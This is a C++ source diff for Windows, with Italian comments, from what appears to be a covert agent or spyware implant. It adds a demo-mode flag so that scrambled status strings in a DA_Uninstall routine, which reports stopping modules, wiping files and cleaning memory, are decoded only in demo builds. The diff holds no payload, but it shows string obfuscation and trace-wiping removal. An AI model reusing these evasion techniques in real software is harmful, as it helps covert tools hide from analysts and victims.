@@ -13,9 +13,30 @@ class ScrambleString
 		return "NIL";
 	}
 
+	WCHAR *get_wstr()
+	{
+		return string_w;
+	}
+
 	ScrambleString(char *ob_str) 
 	{
 		string = LOG_ScrambleName(ob_str, 2, FALSE);
+		if (string)
+			_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
+		else
+			_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
+	}
+
+	ScrambleString(char *ob_str, BOOL is_demo) 
+	{
+		if (is_demo) {
+			string = LOG_ScrambleName(ob_str, 2, FALSE);
+			if (string)
+				_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
+			else
+				_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
+		} else
+			_snwprintf_s(string_w, 64, _TRUNCATE, L"");		
 	}
 
 	~ScrambleString(void)
@@ -25,6 +46,7 @@ class ScrambleString
 	
 	private:
 	char *string;
+	WCHAR string_w[64];
 };
 
 extern BOOL IsDeepFreeze();
@@ -305,10 +327,10 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 {
 	char conf_path[DLLNAMELEN];
 
-	ScrambleString ssok("QM\r\n"); // "OK\r\n"
-	ScrambleString ss1("_ 4vE77UPC 8WW oEidWl1.........."); // "- Stopping all modules.........."
-	ScrambleString ss2("_ jU7UPC Edv zUWl1.............."); // "- Wiping out files.............."
-	ScrambleString ss3("_ BWl8PUPC oloEtJ..............."); // "- Cleaning memory..............."
+	ScrambleString ssok("QM\r\n", is_demo_version); // "OK\r\n"
+	ScrambleString ss1("_ 4vE77UPC 8WW oEidWl1..........", is_demo_version); // "- Stopping all modules.........."
+	ScrambleString ss2("_ jU7UPC Edv zUWl1..............", is_demo_version); // "- Wiping out files.............."
+	ScrambleString ss3("_ BWl8PUPC oloEtJ...............", is_demo_version); // "- Cleaning memory..............."
 
 	// Aspetta che il thread di azioni istantanee sia morto.
 	// A quel punto ha pieni poteri su tutto visto che viene gestita solo 
